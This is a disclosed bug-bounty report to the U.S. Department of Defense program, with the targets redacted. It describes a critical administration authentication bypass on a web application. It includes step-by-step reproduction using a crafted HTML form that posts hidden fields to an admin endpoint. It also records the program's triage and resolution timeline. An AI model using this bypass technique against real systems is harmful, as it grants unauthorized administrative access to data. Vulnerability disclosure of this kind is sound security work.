---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/improper-authentication-generic
  - env/web
substate: "resolved"
weakness: "Improper Authentication - Generic"
enriched: true
body: true
date: 2021-04-20
submitted: 2021-04-02T23:46:59.334Z
bounty_usd: null
votes: 16
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "fiveguyslover"
source: "https://hackerone.com/reports/1146600"
title: "Administration Authentication Bypass on https://█████"
---
# Administration Authentication Bypass on https://█████

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 16 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2021-04-20

- Report: [https://hackerone.com/reports/1146600](https://hackerone.com/reports/1146600)
- CWE: Improper Authentication - Generic
- Submitted: 2021-04-02T23:46:59.334Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi there
I found a way to connect to an administration space on your website https://██████████

#how to reproduce ?

1) - go to this link : https://███/██████████
2) - create a html file with : 
```html
<form action="https://████████/██████████" method="post">
    <input type="hidden" name="█████" value="">
    <input type="hidden" name="█████" value="1">
    <input type="submit">
</form>
```
3) - launch the file, click on the button and return to the page https://███████/█████
4) - refresh the page and you have access to the administration

POC : 

██████████

if you need more information, contact me

best regards,
fiveguyslover

## Impact

access to sensitive data and the ability to modify information.

## System Host(s)
█████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1) - go to this link : https://█████/███████
2) - create a html file with : 
```html
<form action="https://█████/███" method="post">
    <input type="hidden" name="███" value="">
    <input type="hidden" name="████" value="1">
    <input type="submit">
</form>
```
3) - launch the file, click on the button and return to the page https://██████/█████
4) - refresh the page and you have access to the administration

## Suggested Mitigation/Remediation Actions

## Timeline

- **Report Filed**
- **2021-04-02** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Severity Updated**
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **2021-04-16** @fiveguyslover: hi there, any update here ?
thanks
fiveguyslover !
- **2021-04-16** @agent-l8: Greetings! We usually redact and disclose within 2 weeks, often earlier depending on other factors. Your report is in the queue for valid disclosure. Thank you!
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
